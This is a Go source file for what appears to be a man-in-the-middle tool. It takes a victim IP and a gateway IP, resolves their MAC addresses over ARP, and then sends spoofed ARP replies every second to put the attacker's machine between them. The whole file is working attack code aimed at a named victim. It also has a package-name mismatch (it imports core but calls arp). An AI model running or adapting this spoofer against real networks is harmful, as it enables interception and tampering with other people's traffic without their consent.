package main

import (
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/e0d1n/mitm/core"
	"github.com/e0d1n/mitm/utils"
	"github.com/google/gopacket/pcap"
)

func main() {

	var err error
	var handle *pcap.Handle

	promiscuous := true
	snapshot_len := 1024
	timeout := time.Duration(-1) * time.Second
	arp_timeout := 1

	i := flag.String("i", "en0", "Interface to listen on")
	g := flag.String("g", "192.168.1.1", "Gateway Ip address")
	flag.Parse()

	args := flag.Args()

	if len(args) == 0 {
		fmt.Fprintln(os.Stderr, "No victim IP specified")
		os.Exit(1)
	}

	devicename := *i
	gateway := arp.Node{utils.GetIp(*g), []byte{}}
	victim := arp.Node{utils.GetIp(args[0]), []byte{}}

	// Return the device ipv4
	snifferip, snifferhw := utils.GetIPv4Hw(devicename)
	sniffer := arp.Node{snifferip, snifferhw}

	// Open handler
	handle, err = pcap.OpenLive(devicename, int32(snapshot_len), promiscuous, timeout)
	if err != nil {
		panic(err)
	}
	// Remember to close the handle
	defer handle.Close()

	stop := make(chan bool)
	attack := make(chan bool)
	done := make(chan bool)
	response := make(chan arp.ARPResponse)

	arps := []arp.Node{gateway, victim}
	arp_channel := make(chan []byte, 2)

	// Start up a goroutine to read and write packet data until stop chan is triggered.
	go arp.ReadARP(handle, devicename, response, stop)
	go arp.RequestARP(handle, devicename, arp_channel, stop)

	// Timeout
	go func() {
		select {
		case <-done:
			return
		case <-time.After(time.Second * 10):
			close(stop)
			return
		}
	}()

	// Process responses, and keep feeding the arp_channel with not know response
	go func() {
		doneIP := [][]byte{}
		// Send the first arps
		for _, a := range arps {
			arp_channel <- a.Ip
			fmt.Println("Sending1")
			fmt.Println(a.Ip)
		}
		for {
			var resp arp.ARPResponse
			select {
			case <-stop:
				fmt.Println("Couldn't connect with the specified hosts")
				done <- false
				return
			case resp = <-response:
				ip := resp.IP
				fmt.Println("Got response")
				fmt.Println(resp)
				if arp.IndexByte(doneIP, ip) == -1 {
					if i := arp.IndexNode(arps, ip); i >= 0 {
						arps[i].Hw = resp.HW
						doneIP = append(doneIP, ip)
						if len(arps) == len(doneIP) {
							fmt.Println("DONE")
							done <- true
							return
						}
					}
				}
			}
		}
	}()

	ready := <-done

	if ready {
		table := arp.ARPSpoffing{
			Node1:   arps[0],
			Node2:   arps[1],
			Sniffer: sniffer,
		}
		go func() {
			for {
				arp.SpoofARP(handle, &table)
				time.Sleep(time.Duration(arp_timeout) * time.Second)
			}
		}()
		<-attack
	}
}
